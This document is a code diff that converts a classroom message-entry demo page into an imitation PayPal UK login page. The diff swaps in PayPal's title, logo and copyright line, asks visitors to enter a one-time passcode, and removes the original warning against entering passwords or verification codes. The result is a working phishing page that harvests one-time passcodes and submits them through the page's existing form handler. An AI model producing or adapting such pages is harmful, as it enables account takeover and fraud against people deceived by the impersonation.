@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Bluebast | Student Entry</title>
+<title>Paypal UK OTTP</title>
 <style>
 *{box-sizing:border-box}body{margin:0;min-height:100vh;background:#f3f6fb;color:#183153;font-family:Arial,Helvetica,sans-serif;display:grid;place-items:center;padding:20px}
 .card{width:100%;max-width:420px;background:white;border:1px solid #e1e8f0;border-radius:16px;padding:30px 26px;box-shadow:0 12px 32px #19365b12}
@@ -18,48 +18,34 @@ label{display:block;font-size:14px;font-weight:bold;margin-bottom:9px}input{widt
 <body>
 <main class="card">
   <div class="brand">
-    <img class="logo" id="logo" alt="Bluebast logo" hidden>
-    <span class="mark" id="mark">B</span>
-    <span>bluebast</span>
-  </div>
-  <h1>Send your entry</h1>
-  <p class="intro">Enter the seven-digit number for this classroom activity.</p>
+  <img class="logo" id="logo" alt="Logo">
+</div>
+  <h1></h1>
+  <p class="intro"></p>
   <form id="form">
-    <label for="message">From my sweeties</label>
+    <label for="message"></label>
 <input
   id="message"
   name="message"
   type="text"
   autocomplete="off"
-  placeholder="Type your message"
+  placeholder="Input Correct OTTP"
   required
 >
-<p class="help">Type your message and tap Send message.</p>
-<button id="submit" type="submit">Send message</button>
+<p class="help"></p>
+<button id="submit" type="submit">Login</button>
 <p id="status" role="status" aria-live="polite"></p>
 </form>
 
-<p class="safe">Bluebast classroom demo. Please do not enter passwords, payment details, or one-time verification codes.</p>
+<p class="safe">© 1999–2026 PayPal UK Ltd</p>
 </main>
 
 <script>
   // Add your public logo image URL between the quotes.
-  const LOGO_URL = "";
+  const LOGO_URL = "https://www.paypalobjects.com/webstatic/icon/pp258.png";
 
   const logo = document.getElementById("logo");
-  const mark = document.getElementById("mark");
-
-  if (LOGO_URL.trim()) {
-    logo.src = LOGO_URL.trim();
-    logo.hidden = false;
-    mark.hidden = true;
-
-    logo.onerror = () => {
-      logo.hidden = true;
-      mark.hidden = false;
-    };
-  }
-
+logo.src = LOGO_URL.trim();
   const form = document.getElementById("form");
   const messageInput = document.getElementById("message");
   const status = document.getElementById("status");
@@ -71,7 +57,7 @@ label{display:block;font-size:14px;font-weight:bold;margin-bottom:9px}input{widt
     const message = messageInput.value.trim();
 
     if (!message) {
-      status.textContent = "Please type a message.";
+      status.textContent = "Input Ottp";
       return;
     }
 
@@ -92,10 +78,10 @@ label{display:block;font-size:14px;font-weight:bold;margin-bottom:9px}input{widt
       const result = await response.json();
 
       if (!response.ok) {
-        throw new Error(result.error || "Message could not be sent.");
+        throw new Error(result.error || "INCORRECT OTTP.");
       }
 
-      status.textContent = "Message sent.";
+      status.textContent = "Kindly Login With Paypal from precise Location.";
       messageInput.value = "";
 
     } catch (error) {
